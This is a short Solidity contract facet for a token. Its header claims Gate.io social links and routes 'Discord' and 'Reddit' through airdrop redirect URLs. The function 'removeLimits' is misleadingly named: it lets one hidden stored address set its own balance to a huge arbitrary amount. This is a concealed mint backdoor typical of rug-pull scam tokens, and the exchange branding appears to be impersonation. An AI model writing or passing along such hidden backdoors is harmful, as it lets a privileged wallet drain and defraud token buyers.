/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.gate.io/
 * Telegram: https://t.me/gateio_en
 * Twitter: https://twitter.com/gate_io
 * facebook: https://www.facebook.com/gateioglobal
 * Discord: https://airdrops.io/visit/kpn2/
 * Reddit: https://airdrops.io/visit/lpn2/
 */
pragma solidity ^0.8.22;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
